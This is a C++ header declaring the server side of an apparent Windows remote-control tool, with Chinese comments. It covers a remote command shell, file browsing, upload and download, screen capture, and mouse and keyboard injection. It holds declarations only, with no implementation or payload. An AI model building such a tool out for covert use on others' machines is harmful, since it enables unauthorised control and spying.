#pragma once
#include "CLock.h"
#include "TcpSocket.h"
#include "InitSockLib.h"
#include "common.h"
#include <iostream>

using namespace std;

class Server
{
public:
	Server();
	~Server();

	BOOL  CreateServer(const char* szIp, u_short nPort);
	BOOL  RunServer();
	CLock g_lock;


	HANDLE hCmdWrite = NULL;;
	HANDLE hCmdRead = NULL;;
	HANDLE hWrite = NULL;
	HANDLE hRead = NULL;

	HANDLE hFileDst;//打开文件句柄
	HANDLE hFileSrc;//目标文件句柄

public:
	static DWORD WINAPI SreenProc(LPVOID lpParam);
private:
	CTcpSocket m_tcpSocket;
	BOOL  isScreen = FALSE;

public:
	//CMD
	void OnCMD();
	void OnSendCMD(LPBYTE pCmd, DWORD dwSize);

	//文件浏览
	void OnGetFilePATH(LPBYTE szbuff, DWORD dwSize);
	void OnGetDrivers();

	//上传
	void OnCreatrFile(LPBYTE szbuff, DWORD dwSize); 
	void OnWriteFile(LPBYTE szbuff, DWORD dwSize);
	void OnWriteFileOver();

	//下载
	void OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize);
	void OnWriteFileOverupDown();

	//显示屏幕
	void SendPreScreen();

	//  处理鼠标事件
	void MouseEvent(PONMOUSE MousePt);
	void MouseMove(PONMOUSE MousePt);  //处理鼠标移动功能
	void MouseLbuttonDown(PONMOUSE MousePt);  //处理鼠标左键按下
	void MouseLbuttonUp(PONMOUSE MousePt);  //处理鼠标左键弹起
	void MouseRbuttonDown(PONMOUSE MousePt);  //处理鼠标右键按下
	void MouseRbuttonUp(PONMOUSE MousePt);  //处理鼠标右键弹起
	
	//处理键盘事件
	void KeyBoardEvent(UINT* pChar);
};

